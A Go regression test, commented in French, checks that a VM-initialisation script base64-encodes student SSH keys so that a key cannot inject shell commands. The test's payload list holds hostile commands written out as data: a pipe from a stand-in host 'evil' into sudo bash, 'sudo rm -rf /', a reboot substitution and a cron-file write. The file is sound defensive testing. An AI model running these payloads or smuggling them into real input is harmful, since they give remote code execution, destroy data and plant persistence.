package attribvm

import (
	"encoding/base64"
	"strings"
	"testing"

	"control_center/models"
)

// TestCmdInit_NoShellInjection est un test de RÉGRESSION pour la faille critique d'injection
// de commande via le champ commentaire (attaquant-contrôlé) d'une clé SSH. Avant correctif,
// la clé était interpolée telle quelle dans un script exécuté en root sur la VM → RCE.
// Le correctif transmet la clé en base64 et la décode côté VM. On vérifie ici que :
//  1. la charge utile brute (avec métacaractères shell) n'apparaît JAMAIS dans le script ;
//  2. le script embarque bien le base64 de la clé, redécodable à l'identique.
func TestCmdInit_NoShellInjection(t *testing.T) {
	payloads := []string{
		`ssh-ed25519 AAAA... user@host`,                              // clé légitime
		`ssh-ed25519 AAAA... "; curl http://evil/x | sudo bash; "`,    // injection via commentaire
		"ssh-rsa AAAA $(reboot)",                                      // substitution de commande
		"ssh-rsa AAAA `id`",                                           // backticks
		"ssh-rsa AAAA\n sudo rm -rf /",                                // saut de ligne → nouvelle commande
		"' ; echo pwned > /etc/cron.d/x ; '",                          // fermeture d'apostrophe
	}

	for _, p := range payloads {
		script := cmdInit(models.Student{Name: "alice@example.com", SshKey: p})

		// 1. La charge brute dangereuse ne doit pas se retrouver littéralement dans le script.
		// (Pour la clé légitime, on ne teste que la non-régression du base64 ci-dessous.)
		for _, marker := range []string{"reboot", "rm -rf", "curl http://evil", "pwned", "`id`"} {
			if strings.Contains(p, marker) && strings.Contains(script, marker) {
				t.Errorf("charge brute %q présente dans le script généré (injection possible)\nscript:\n%s", marker, script)
			}
		}

		// 2. Le base64 de la clé (alphabet sûr) doit être présent et redécodable à l'identique.
		want := base64.StdEncoding.EncodeToString([]byte(strings.TrimSpace(p)))
		if !strings.Contains(script, want) {
			t.Errorf("le base64 attendu de la clé est absent du script\nclé=%q\nattendu(b64)=%q", p, want)
		}
		decoded, err := base64.StdEncoding.DecodeString(want)
		if err != nil || string(decoded) != strings.TrimSpace(p) {
			t.Errorf("le base64 embarqué ne redécode pas la clé d'origine: %v", err)
		}
	}
}

// TestCmdInit_DecodePipeline vérifie que le script utilise bien le pipeline `base64 -d`
// (et non une interpolation directe), garde-fou structurel du correctif.
func TestCmdInit_DecodePipeline(t *testing.T) {
	script := cmdInit(models.Student{Name: "bob@example.com", SshKey: "ssh-ed25519 AAAA test"})
	if !strings.Contains(script, "base64 -d") {
		t.Error("le script ne décode pas la clé via 'base64 -d' (le correctif anti-injection a peut-être été retiré)")
	}
}
